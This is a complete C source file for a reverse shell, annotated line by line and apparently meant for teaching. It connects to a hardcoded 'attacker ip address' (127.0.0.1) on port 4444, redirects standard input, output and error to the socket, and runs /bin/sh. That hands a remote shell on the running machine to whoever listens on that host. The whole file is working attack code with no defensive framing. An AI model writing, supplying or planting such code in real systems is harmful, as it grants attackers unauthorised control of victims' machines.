#include<stdio.h>
#include<sys/socket.h>
#include<netinet/ip.h>
#include<arpa/inet.h>
#include<unistd.h>



int main(){

	// attacker ip address
	const char* ip="127.0.0.1";

	// address struct
	struct sockaddr_in addr;
	
	// set the address family to ipv4
	addr.sin_family=AF_INET;

	//set the port number
	addr.sin_port=htons(4444);

	// inet_aton takes the IP string 'ip' and fills the sin_addr field of addr
	inet_aton(ip,&addr.sin_addr);

	// socket syscall
	int sockfd=socket(AF_INET,SOCK_STREAM,0);

	// connect syscall
	connect(sockfd,(struct sockaddr *)&addr,sizeof(addr));


	// loop through the standard file descriptors 
	for(int i=0;i<3;i++){
		// dup2 duplicates the socket file descriptor (sockfd) to the current file descriptor (i)
		dup2(sockfd,i);
	}

	// Print the initial shell prompt
	write(1, "shell> ", 7);

	// Execute the shell
    		execve("/bin/sh", NULL, NULL);
    
}
